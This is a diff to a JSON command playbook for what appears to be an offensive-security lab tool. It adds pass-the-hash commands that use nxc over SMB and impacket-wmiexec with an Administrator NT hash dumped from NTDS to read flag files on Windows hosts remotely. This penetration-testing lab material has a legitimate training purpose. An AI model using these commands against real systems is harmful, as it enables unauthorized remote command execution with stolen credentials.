@@ -111,6 +111,11 @@
       },
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /r C:\\\\Users %i in (user.txt local.txt proof.txt) do @type \"%i\"'",
+          "note": "No shell needed. With the dumped Administrator hash, find and print the user/proof flag anywhere under C:\\Users remotely over SMB. obol fills the hash from the NTDS dump, no credential swap. The winrm CLIENT_TO_SERVER_SEALING error is an evil-winrm bug; this avoids it."
+        },
+        {
           "tool": "cmd",
           "note": "IN YOUR SHELL (no credential needed): find and print the user flag with your identity for the screenshot.",
           "run": "hostname & ipconfig & where /r C:\\Users local.txt user.txt proof.txt 2>nul & type {{flag_path_local}}"
@@ -155,6 +160,16 @@
         "severity": "critical"
       },
       "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt'",
+          "note": "PREFERRED, no shell needed. With the Administrator NT hash you just dumped from NTDS, read the root flag remotely over SMB. obol fills the hash from the dump, so you do not have to switch your active credential. If evil-winrm died with CLIENT_TO_SERVER_SEALING (a known ruby/evil-winrm bug on a fresh Kali), use this: nxc reads the flag without evil-winrm."
+        },
+        {
+          "tool": "impacket-wmiexec",
+          "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}} 'type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt'",
+          "note": "Fallback remote read with the DA hash via impacket wmiexec (semi-interactive is also fine: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}})."
+        },
         {
           "tool": "cmd",
           "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity. Screenshot whoami + hostname + ipconfig + the flag together. obol records this as the captured root flag — the box's final objective.",
